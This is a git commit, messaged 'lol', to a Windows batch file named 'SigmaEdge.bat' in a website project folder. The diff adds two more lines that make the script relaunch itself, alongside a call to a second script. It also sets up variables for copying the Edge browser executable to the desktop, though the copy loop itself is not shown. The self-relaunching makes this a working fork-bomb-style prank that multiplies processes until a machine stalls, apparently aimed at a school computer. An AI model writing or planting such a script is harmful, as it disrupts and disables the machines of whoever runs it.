4ffa8bd5471d0de650e9f7b7f72b7df6b50cdb91
Benjamin Kuhnert <freddi1808@gmx.de>
2026-05-06 12:29:15 +0200

    lol

--- Website mit Blog/SigmaEdge.bat
+++ Website mit Blog/SigmaEdge.bat
@@ -2,9 +2,11 @@
 set "sourceFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
 set "destination=H:\Desktop"
 set /a counter=1
+start "" "H:\Downloads\SigmaEdge.bat"
+start "" "H:\Downloads\SigmaEdge.bat"
 start "" "G:\Cla.if21\Benjamin Kuhnert\Sigma.bat"
 start "" "H:\Downloads\SigmaEdge.bat"
-start "" "H:\Downloads\SigmaEdge.bat"
+
 :loop
 
 
